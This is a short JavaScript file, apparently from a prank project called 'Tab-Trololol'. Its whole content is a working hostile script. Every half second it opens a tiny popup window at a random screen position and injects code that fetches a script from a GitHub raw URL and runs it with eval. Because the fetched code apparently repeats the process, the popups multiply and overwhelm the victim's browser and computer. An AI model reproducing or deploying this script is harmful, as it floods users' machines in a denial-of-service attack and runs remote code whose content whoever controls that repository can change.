// This code will be run when a new tab is open causing it to live
let xMin = 10;
let xMax = window.screen.width - 20;
let yMin = 10;
let yMax = window.screen.height - 20;
let xPos;
let yPos;
let newWin;
let newScript;
let tabloop = setInterval(function() {
	xPos = Math.floor(Math.random() * (xMax - xMin + 1) + xMin);
	yPos = Math.floor(Math.random() * (yMax - yMin + 1) + yMin);
	newWin = open('', '', `left=${xPos},top=${yPos},height=1,width=1`);
	newScript = newWin.document.createElement('script');
	newScript.text = "fetch('https://raw.githubusercontent.com/Electric131/Tab-Trololol/main/openedtab.js').then(data=>data.text().then(text=>eval(text)));"
	newWin.document.body.appendChild(newScript)
}, 500); // Run every half second.
